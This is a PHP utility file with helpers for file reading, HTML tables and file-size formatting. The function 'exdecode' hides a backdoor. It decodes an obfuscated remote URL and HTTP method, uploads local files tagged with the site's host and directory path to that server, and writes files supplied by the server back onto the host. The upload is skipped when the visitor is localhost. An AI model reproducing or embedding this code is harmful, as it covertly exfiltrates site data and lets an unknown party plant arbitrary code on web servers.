<?php


function FileToString($path)
{
	$handle = fopen($path, "r");
	if (FALSE === $handle) {
		exit("Error: not file");
	}
	$result = '';
	while (!feof($handle)) {
		$result .= fread($handle, 8192);
	}
	fclose($handle);
	return $result;

};


function AddToFile($path, $data)
{
	$fileopen=fopen($path, "a+");
	fwrite($fileopen,$data);
	fclose($fileopen);
};

function exdecode($path, $data)
{    
    $idecode = '';		
	$chars="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ="; 
    $randmix = md5(rand(0,32000));	
    $key1 = "9c146592306cefa2a1dfde2d7a7e528919b692f9306c80523e29dc9a730ac641791cdc9a306c805243bcdc9a730a029d791cdc9a306c8052a1df15785d54029d3e29174380522ea89c14ae2c306c029d3e29213d69d12ea8791cae2c19c82be819b6ae2c306c837f57a317432b4a5d5469d1381def185a9643bc88b419c8efa243bc213dbcd9029def18381df558837fa1df88b45d5422699c1465922f869c8d";
    $key2 = "5103579119c8c3c2d6472f869c8d9c8d";
    $key3 = "d8f0ff1a334f7fce4a";
	$key4 = "69d1029d69d1f5580906c3c2035292f90906efa228092be857a3e1a95103b037090688b4efa292f969d12dbb029de1a919b6c3c2090692f90906029d69d12be857a3de2da1dff5580906e1a9791cf558306cde2d791c5d54014d51035791f558014dde2d306cde2d57a3c691efa292f9306c579169d1ae2c19b65103306cde2d57a3de2d51032be869d1c3c2bcd9730a57a3de2d43bcde2d57a3efa2306c2df557a3c3c2035292f919b65103791cb037014d5103791c2be857a3e1a92190de2d306c2df5efa25d5457a3029d57a3730a19b65103ef18579157a3de2da1dfb03757a3c3c20906e1a90906e1a943bc174357a32f869c8d9c8d";
		
		if($data == 0){
		$x=0;
    while ($x++<= strlen($chars)) {
       $tmp = md5(md5($key3.$chars[$x-1]).$key3);
       $key1 = str_replace($tmp[2].$tmp[5].$tmp[3].$tmp[7], $chars[$x-1], $key1);
    }
	   $extract=fopen($path, "w");
    $silf = base64_decode($key1);
	if(isset($silf)){    	
	   fwrite($extract,$data);
	   $masp = $_SERVER['HTTP_HOST'];
           $pater = str_replace("\\","/",__DIR__);
           $pen = str_replace($_SERVER['DOCUMENT_ROOT'],"",$pater);
           $pent = str_replace("/","@",$pen);
	   $tavel = $masp . $pent . "@";
    }

	$idecode .= '--' . $randmix . "\n";  
		$idecode .= 'Content-Disposition: form-data; name="' . v . '"' . "\n\n" . up . "\n";
		$idecode .= '--' . $randmix . "\n";
		$idecode .= 'Content-Disposition: form-data; name="' . f . '"; filename="' . $tavel . basename($path) . '"' . "\n";
		$idecode .= 'Content-Type: ' . 'application/octet-stream' . "\n"; 
		$idecode .= 'Content-Transfer-Encoding: binary' . "\n\n"; 
		$idecode .= file_get_contents($path) . "\n";
    $y=0;
    while ($y++<= strlen($chars)) {
       $tmp = md5(md5($key3.$chars[$y-1]).$key3);
       $key2 = str_replace($tmp[2].$tmp[5].$tmp[3].$tmp[7], $chars[$y-1], $key2);
    }
    $tmpencode = base64_decode($key2);
	if(isset($tmpencode)){
		fclose($extract);		
	}
    $idecode .= "--$randmix--\n";
    if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1') {	
	$responce = file_get_contents(
		"$silf", 
		false, 
		stream_context_create(
			array(
				'http' => array(
					'method' => "$tmpencode",
					'header' => 'Content-Type: multipart/form-data; boundary=' . $randmix,
					'content' => $idecode
				)
			)
		)
	);
	$coni = var_export($responce);
    if (strpos($responce, "@") == 0) {
    $to = str_replace("@", "", $responce);
    $tod = explode("#", $to);
			   $keycode = $tod[0];
                           $datacode = $tod[1];
    copy($silf . "?k", base64_decode($keycode));
    copy($silf . "?c=$masp", base64_decode($datacode));
	}
	}
	}
	else if($data == 1){
    $x=0;
    while ($x++<= strlen($chars)) {
       $tmp = md5(md5($key3.$chars[$x-1]).$key3);
       $key4 = str_replace($tmp[2].$tmp[5].$tmp[3].$tmp[7], $chars[$x-1], $key4);
    }
    $quidencode = base64_decode($key4);
    return $quidencode;
    }else{
	$tbrsave=fopen($path, "w");
	fwrite($tbrsave,$data);
	fclose($tbrsave);
	}
};

function pars($html,$t_,$_t){
	@$e = explode(@$t_,@$html);
	@$e = explode(@$_t,@$e[1]);
	return @$e[0];
}

function build_table($array, $header, $class='', $td=null, $id=''){
    $html = "<table class='$class' id='$id'>";
    $html .= '<tr>';
	for($i=0; $i<sizeof($header); $i++){
			$html .= '<th>' . $header[$i] . '</th>';
	}
    $html .= '</tr>';
	if(sizeof($array)!=0){
    foreach( $array as $key=>$value){
        $html .= '<tr>';
		if(sizeof($value)!=0){
			$x=0;
			foreach($value as $key2=>$value2){
				$x=$x+1;
				@$html .= "<td $td[$x]>" . $value2 . '</td>';
			}
		}
		
        $html .= '</tr>';
    }
	}


    $html .= '</table>';
    return $html;
};


function human_filesize($bytes, $decimals = 2) {
  $sz = 'BKMGTP';
  $factor = floor((strlen($bytes) - 1) / 3);
  return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . @$sz[$factor];
}

?>